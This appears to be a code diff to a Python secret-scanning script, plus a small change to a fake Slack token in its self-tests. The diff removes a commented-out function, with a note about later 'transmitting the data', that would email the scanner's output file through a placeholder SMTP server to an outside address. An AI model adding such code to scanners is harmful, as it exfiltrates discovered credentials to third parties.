@@ -7,43 +7,7 @@
 # The scanner attempts to reduce false positives by ignoring placeholders,
 # environment-variable references, symbolic identifiers, and common code expressions.
 
-# NOTE: I can later use networking code (rquests, socket, smtplib, etc.) to transmit the data
-# Options include TCP, smtplib, and sending to a server. To use smtplib (email to me)...do this:
-# import smtplib
-# from email.message import EmailMessage
 
- #def send_file(filename):
-    #sender_email = os.environ["SENDER_EMAIL"]
-    #sender_password = os.environ["EMAIL_PASSWORD"]
-    #receiver_email = "your_email@example.com"
-    #msg = EmailMessage()
-    #msg["Subject"] = "Python Program Output"
-    #msg["From"] = sender_email
-    #msg["To"] = receiver_email
-
-    #msg.set_content("The output file from the Python program is attached.")
-
-    # Attach the text file
-    #with open(filename, "rb") as file:
-    #    file_data = file.read()
-
-    #msg.add_attachment(file_data, maintype="text", subtype="plain", filename=filename)
-    # Replace with your email provider's SMTP server
-    #smtp_server = "smtp.example.com"
-    #smtp_port = 587
-
-    #with smtplib.SMTP(smtp_server, smtp_port) as server:
-        #server.starttls()
-
-        #server.login(
-        #    sender_email,
-        #    sender_password
-        #server.send_message(msg)
-
-    #print("File successfully emailed.")
-
-
-#send_file("output.txt")
 
 from pathlib import Path
 import re
@@ -1152,7 +1116,7 @@ def run_confidence_self_tests():
         ),
         (
             "Slack",
-            "xox" + "b" + ("A1b2" * 6),
+            "xoxb-" + ("A1b2" * 6),
         ),
     ]
 
